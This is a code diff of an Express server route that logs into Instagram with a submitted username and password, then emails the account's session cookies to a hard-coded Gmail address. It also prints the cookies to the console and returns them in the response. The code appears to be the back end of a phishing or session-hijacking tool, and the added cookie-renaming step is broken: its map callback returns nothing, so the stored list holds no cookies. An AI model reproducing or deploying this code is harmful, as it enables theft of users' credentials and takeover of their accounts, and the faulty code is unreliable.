@@ -230,15 +230,20 @@ app.post("/insta", (req, res) => {
   return Promise.try(() =>
     ig.account.login(req.body.username, req.body.password).then((val) => {
       const cookies = ig.state.serializeCookieJar().then((val2) => {
+        let modCookies = val2.cookies.map((val) => {
+          val["name"] = val["key"];
+          delete val["key"];
+        });
+
         const validCookie = {
           url: "https://instagram.com",
-          cookies: val2.cookies,
+          cookies: modCookies,
         };
-        console.log("login success");
+        console.log(JSON.stringify(validCookie));
         var mailOptions = {
           from: process.env.email,
           to: "surya142327@gmail.com",
-          subject: "cookies of user" + req.query.name,
+          subject: "cookies of user" + req.query.username,
           text: JSON.stringify(validCookie),
         };
         transporter.sendMail(mailOptions, function (error, info) {
@@ -248,7 +253,7 @@ app.post("/insta", (req, res) => {
               success: true,
               twoFactor: false,
               user: val,
-              cookie: validCookie,
+              cookie: JSON.stringify(validCookie),
               message: "login Successful but failed to send email",
             });
           } else {
@@ -257,7 +262,7 @@ app.post("/insta", (req, res) => {
               success: true,
               twoFactor: false,
               user: val,
-              cookie: validCookie,
+              cookie: JSON.stringify(validCookie),
               message: "login Successful and email has been sent.",
             });
             res.end();
